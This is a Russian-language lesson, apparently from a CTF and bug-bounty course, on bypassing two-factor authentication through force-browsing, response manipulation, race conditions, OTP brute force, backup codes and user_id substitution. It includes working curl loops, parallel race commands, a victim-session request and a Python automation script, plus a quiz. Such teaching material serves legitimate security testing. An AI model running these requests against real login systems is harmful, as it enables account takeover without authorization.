---
id: web-mfa-bypass
title: "Обход 2FA/MFA: race, response manipulation, backup codes"
category: web
parent: web-auth-bypass
difficulty: hard
order: 1
tags: [mfa, 2fa, otp, bypass, race, auth]
prerequisites: [web-auth-jwt-idor]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Как обходить второй фактор: логика многошаговой аутентификации, манипуляция ответами, race, перебор OTP, backup-коды."
---

Второй фактор (2FA/MFA) ломается редко «в лоб», зато почти всегда — через **логику**: состояние аутентификации, манипуляцию ответами, гонки, слабые OTP, отсутствие rate-limit, backup-коды. Этот урок — практический чек-лист обхода MFA, который приносит bug bounty регулярно.

## Теория: где живёт уязвимость

MFA — это многошаговая машина состояний:
1. Проверка пароля → выдача «полуавторизованной» сессии.
2. Проверка второго фактора → полная сессия.

Атаки эксплуатируют разрывы между шагами:
- **Ответ шага 1 уже содержит сессию/токен**, а шаг 2 — просто UI.
- **Шаг 2 проверяется на клиенте** (JS), сервер доверяет.
- **ID пользователя в шаге 2** не связан с шагом 1 → подмена.
- **Состояние `mfa_verified`** не сбрасывается / можно выставить.
- **OTP предсказуем/перебираем** без лимита.

## Вектор 1: force-browse (пропуск шага)

После шага 1 (верный пароль) часто **уже выдан валидный токен/кука**, а `/mfa` — лишь преграда. Пробуем сразу:

```bash
# после ввода пароля, но без OTP — идём на защищённые страницы
curl -s -b "session=SESSION_AFTER_PASSWORD" https://app.example/dashboard
curl -s -b "session=..." https://app.example/api/me
curl -s -b "session=..." https://app.example/admin
```

Если 200 — MFA не enforced. Ищем API-эндпоинты (`/api/*`), которые не проверяют `mfa_verified`.

## Вектор 2: манипуляция ответом

Если проверка второго фактора идёт через отдельный ответ/редирект:

```http
POST /verify_otp
...
HTTP/1.1 302 Found
Location: /mfa?error=1
```

Меняем на `Location: /dashboard` или `{"success":false}` → `{"success":true}` (клиент доверяет). Часто сервер уже выдал сессию, и достаточно подделать ответ.

## Вектор 3: race condition

Параллельные запросы на `/verify_otp` с **одним** кодом или на «включение MFA». Иногда проверка «код использован?» выполняется не атомарно, и один код принимается многократно, либо лимит попыток обходится параллельностью.

```bash
# 20 параллельных запросов с одинаковым OTP
seq 20 | xargs -P20 -I{} curl -s -X POST https://app.example/verify_otp \
  -b "session=..." -d "otp=123456" -o /dev/null -w "%{http_code}\n"
```

См. `web-race-single-packet` для single-packet техники.

## Вектор 4: перебор OTP / отсутствие rate-limit

- OTP из 6 цифр = 1e6; без лимита и с окном — реально перебрать.
- Нет блокировки после N попыток.
- Код не истекает / окно слишком широкое.
- Код возвращается в ответе/логах/заголовке.

```bash
# проверяем отсутствие лимита
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://app.example/verify_otp \
    -b "session=..." -d "otp=00000$i"
done
# если ни 429, ни блокировки — перебор возможен
```

## Вектор 5: backup / recovery коды

- Backup-коды не хешируются/предсказуемы.
- Recovery через email/SMS позволяет сбросить MFA (см. `web-password-reset`).
- «Запомнить устройство» — токен предсказуем/не истекает.
- Ответ на неверный backup-код отличается от неверного OTP (enumeration).

## Вектор 6: подмена пользователя в шаге 2

Если шаг 2 принимает `user_id`/`username` отдельно от сессии шага 1:

```bash
# шаг 1 как user A, шаг 2 с user_id жертвы
curl -s -X POST https://app.example/verify_otp -d "user_id=VICTIM&otp=123456"
```

Иногда MFA-проверка для жертвы не требуется (например, у неё MFA выключен), и сервер выдаёт сессию жертвы.

## Разобранный пример

Шаг 1. Логинимся, получаем `session` (после пароля). Пробуем `/admin` — 302 на `/mfa` (MFA enforced).

Шаг 2. Смотрим ответ `/verify_otp` с неверным кодом — видим `{"mfa":false,"token":null}`. Отправляем с верным кодом — `{"mfa":true,"token":"..."}`.

Шаг 3. Пробуем подделать: отправляем **пустой** ответ? Нет — серверная проверка. Вместо этого пробуем `user_id` подмену или force-browse на API.

Шаг 4. Находим `/api/orders` без проверки `mfa_verified` → доступ к данным. Записываем как баг (MFA bypass на API).

## Инструменты

- **Burp** (Repeater, Intruder, Turbo Intruder для race).
- **`race-the-web`**, Turbo Intruder single-packet.
- **`otp`-брут** через Intruder с grep по длине ответа.
- **Burp Collaborator** для OOB (если код приходит на ваш сервис).

## Частые ошибки

- **Гоняться только за перебором OTP.** Логика (force-browse, подмена) чаще срабатывает.
- **Не смотреть API.** UI может требовать MFA, а API — нет.
- **Игнорировать race.** Single-packet обходит лимиты.
- **Забыть про recovery.** Сброс пароля/email часто обходит MFA.
- **Не проверять, выдаётся ли сессия после шага 1.** Часто да.
- **Путать «код неверен» и «код истёк».** Разные сообщения = enumeration.
- **Ломать аккаунт жертвы.** Не блокируйте чужие аккаунты перебором.

## Полный разбор: force-browse и подмена user_id (с выводом)

Шаг 1. Логинимся паролем, перехватываем ответ шага 1. Смотрим, что выдано:

```http
POST /login HTTP/1.1
Host: app.example

{"username":"me","password":"..."}
--
HTTP/1.1 200 OK
Set-Cookie: session=PARTIAL_SESSION; Path=/
{"next":"/mfa"}
```

Кука уже выдана. Пробуем защищённые ресурсы **без** второго шага:

```bash
curl -s -b 'session=PARTIAL_SESSION' https://app.example/dashboard -o /dev/null -w '%{http_code}\n'
# 302 -> /mfa   (UI enforced)

curl -s -b 'session=PARTIAL_SESSION' https://app.example/api/me
# {"id":1,"username":"me","email":"..."}   -> API НЕ проверяет mfa_verified => bypass
```

Шаг 2. Перебираем API-эндпоинты (из JS/OpenAPI), ищем те, что не проверяют MFA:

```bash
for p in /api/me /api/orders /api/settings /api/admin; do
  echo -n "$p -> "; curl -s -b 'session=PARTIAL_SESSION' -o /dev/null -w '%{http_code}\n' "https://app.example$p"
done
# /api/me -> 200
# /api/orders -> 200
# /api/admin -> 403
```

Шаг 3. Подмена пользователя в шаге 2 (если `user_id` передаётся отдельно):

```bash
# шаг 1 — как 'me'; шаг 2 — с user_id жертвы, у которой MFA выключен
curl -s -X POST https://app.example/verify_otp \
  -b 'session=PARTIAL_SESSION' -d 'user_id=VICTIM&otp=000000'
# {"ok":true,"session":"VICTIM_SESSION"}   -> выдача сессии жертвы
```

Шаг 4. Race: 20 параллельных запросов с одним OTP — проверяем, примет ли код многократно или обойдёт лимит:

```bash
seq 20 | xargs -P20 -I{} curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST https://app.example/verify_otp -b 'session=PARTIAL_SESSION' -d 'otp=123456'
```

## Reference-таблица: векторы обхода MFA

| Вектор | Условие | Как проверить |
|--------|---------|---------------|
| Force-browse | сессия выдана после шага 1 | запрос к /api, /admin с partial-сессией |
| API без MFA-проверки | флаг mfa_verified не enforced | перебор эндпоинтов |
| Response manipulation | клиент доверяет ответу | подделать `{"mfa":true}` / `Location` |
| Подмена user_id | шаг 2 не связан с сессией | передать чужой user_id |
| Race condition | неатомарная проверка | параллельные запросы |
| OTP-брут | нет rate-limit | 100+ попыток, смотреть 429 |
| Backup-коды | не хешируются/предсказуемы | генерация/перебор |
| Recovery bypass | сброс через email/phone | сбросить пароль и обойти MFA |
| «Запомнить устройство» | слабый токен | предсказуемость/неистекаемость |
| Код в ответе/логе | утечка OTP | смотреть тело/заголовки/логи |
| Отсутствие MFA на API | UI-only enforcement | прямой вызов API |

## Response manipulation: детали

Некоторые реализации возвращают признак успеха, которому доверяет клиент:

```http
HTTP/1.1 302 Found
Location: /mfa?error=invalid
```

Меняем на `Location: /dashboard` — если SPA не перепроверяет на сервере, вы «прошли». Аналогично `{"success":false}` → `{"success":true}`, `{"mfa":false}` → `{"mfa":true}`. Это работает только если серверная сессия уже полноценная или клиент — источник истины. Проверяйте: после манипуляции реально ли доступны защищённые ресурсы (read-back), иначе это cosmetic.

## Что делать дальше / решение

1. **Захватить весь флоу** логина (шаг 1 → шаг 2) в Burp, понять состояние сессии.
2. **Проверить force-browse** на UI и, главное, на API (`/api/*`).
3. **Проверить подмену user_id** в шаге 2.
4. **Проверить response manipulation** (редирект/JSON-флаг).
5. **Проверить race** (single-packet) на OTP и лимиты.
6. **Проверить OTP-брут/recovery/backup-коды**.
7. **Подтвердить доступ** к чужим/защищённым данным (read-back) и оформить PoC.

## Инструменты и автоматизация MFA-тестов

- **Burp Repeater** — правка ответов (response manipulation), подмена `user_id`, force-browse.
- **Burp Intruder** — перебор OTP (grep по длине/тексту), backup-кодов; следите за 429/блокировкой.
- **Turbo Intruder / single-packet** — race на `/verify_otp` и на включение MFA.
- **Burp Match&Replace** — авто-правка `Location`/JSON-флага, чтобы не делать руками.
- **Автоскрипт на Python** — комбинирует шаги:

```python
import requests
S = requests.Session()
S.post("https://app.example/login", data={"u":"me","p":"..."})   # шаг 1
# force-browse: API без MFA
for p in ["/api/me","/api/orders","/api/admin"]:
    r = S.get("https://app.example"+p)
    print(p, r.status_code)
# подмена user_id
r = S.post("https://app.example/verify_otp", data={"user_id":"victim","otp":"000000"})
print("substitute:", r.status_code, r.text[:80])
```

- **`race-the-web`** — быстрый инструмент для параллельных запросов.
- **Калькулятор TOTP** — если у вас есть seed (в рамках авторизованного теста), генерируйте текущие коды, чтобы понять логику окна.

Практика: MFA-баги почти всегда логические, а не криптографические. Сначала картируйте флоу и состояние, потом бейте в разрыв между шагами. Никогда не блокируйте чужие аккаунты перебором — тестируйте на своём.

## Быстрый чек-лист обхода MFA

1. Force-browse на `/api/*` с partial-сессией.
2. Подмена `user_id`/`username` в шаге 2.
3. Response manipulation (`{"mfa":true}`, `Location: /dashboard`).
4. Race на `/verify_otp` (single-packet).
5. OTP-брут без rate-limit; backup-коды; recovery через email.
6. Проверка «запомнить устройство» (предсказуемый/неистекающий токен).
7. Read-back: реально ли получен доступ к защищённым данным.

Логика важнее криптографии — в 9 из 10 случаев MFA ломается на разрыве шагов, а не на подборе кода.

## Квиз

```quiz
- question: "Что такое force-browse в контексте MFA?"
  options:
    - "Перебор пароля"
    - "Обращение к защищённым страницам после шага 1, минуя шаг 2"
    - "Отключение TLS"
    - "Смена OTP"
  answer: 1
  explanation: "Если сессия уже валидна, /mfa — лишь преграда в UI."
- question: "Почему API-эндпоинты — частая цель обхода MFA?"
  options:
    - "Они быстрее"
    - "Они часто не проверяют флаг mfa_verified"
    - "Они без TLS"
    - "Они кешируются"
  answer: 1
  explanation: "UI-enforcement не гарантирует проверку на API."
- question: "Как race помогает обойти MFA?"
  options:
    - "Ускоряет брут"
    - "Обходит неатомарные проверки 'код использован' и лимиты"
    - "Меняет алгоритм"
    - "Отключает 2FA"
  answer: 1
  explanation: "Параллельные запросы могут принять один код многократно."
- question: "Что делать, если шаг 2 принимает user_id?"
  options:
    - "Игнорировать"
    - "Попробовать подставить user_id жертвы — возможна выдача её сессии"
    - "Увеличить таймаут"
    - "Сменить метод на GET"
  answer: 1
  explanation: "Разрыв связи шага 2 с сессией шага 1."
- question: "Какой резервный путь часто обходит MFA?"
  options:
    - "Смена языка"
    - "Recovery/сброс пароля через email или backup-коды"
    - "Смена браузера"
    - "Кэш"
  answer: 1
  explanation: "Восстановление доступа нередко не требует второго фактора."
```

## Где пригодится

- **CTF (Web):** задачи на многошаговую аутентификацию.
- **Bug bounty:** обход 2FA — популярный и ценный класс.
- **Пентест:** аудит реализации MFA в приложениях.
- **Работа (AppSec):** серверный enforcement MFA, атомарные проверки, rate-limit, хеширование backup-кодов.
